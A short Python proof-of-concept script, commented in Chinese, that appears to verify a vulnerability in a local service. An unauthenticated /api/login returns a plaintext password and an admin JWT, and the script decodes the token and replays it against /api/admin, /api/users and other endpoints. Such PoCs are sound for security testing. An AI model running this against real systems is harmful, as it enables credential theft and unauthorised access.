#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""PoC: /api/login 未授权凭据泄露 + Token 越权横向验证"""
import json
import base64
import urllib.request
import urllib.error

BASE = "http://127.0.0.1:8800"

def http(method, path, headers=None, body=None):
    req = urllib.request.Request(BASE + path, method=method, headers=headers or {})
    try:
        with urllib.request.urlopen(req, data=body, timeout=5) as r:
            return r.status, dict(r.headers), r.read().decode(errors="replace")
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), e.read().decode(errors="replace")

print("=" * 60)
print("[1] 无凭据访问 /api/login")
print("=" * 60)
code, hdr, body = http("GET", "/api/login")
print(f"HTTP {code}")
print("Body:", body)

data = json.loads(body)
token = data["token"]
user = data["user"]
password = data["password"]

# 解码 JWT payload
hdr_b64, pld_b64, sig = token.split(".")
def b64d(s):
    s += "=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(s.encode()).decode(errors="replace")
print()
print("=" * 60)
print("[2] JWT 解码")
print("=" * 60)
print("Header :", b64d(hdr_b64))
print("Payload:", b64d(pld_b64))
print("Sig    :", sig)

# 用泄露的 token 横向访问其它接口
probes = [
    ("GET",  "/api/user",     {"Authorization": f"Bearer {token}"}),
    ("GET",  "/api/admin",    {"Authorization": f"Bearer {token}"}),
    ("GET",  "/api/users",    {"Authorization": f"Bearer {token}"}),
    ("GET",  "/api/profile",  {"Authorization": f"Bearer {token}"}),
    ("GET",  "/api/orders",   {"Authorization": f"Bearer {token}"}),
    ("GET",  "/",             {"Authorization": f"Bearer {token}"}),
    ("GET",  "/api/login",    None),  # 二次确认未授权即可重放
]
for m, p, h in probes:
    print()
    print("=" * 60)
    print(f"[probe] {m} {p}  headers={h}")
    print("=" * 60)
    c, _, b = http(m, p, h)
    print(f"HTTP {c}")
    print("Body:", b[:500] if b else "(empty)")

print()
print("=" * 60)
print("[3] 总结: 泄露字段")
print("=" * 60)
print(f"  user     = {user}")
print(f"  password = {password}    <-- 明文泄露")
print(f"  token    = {token}        <-- 管理员 JWT")
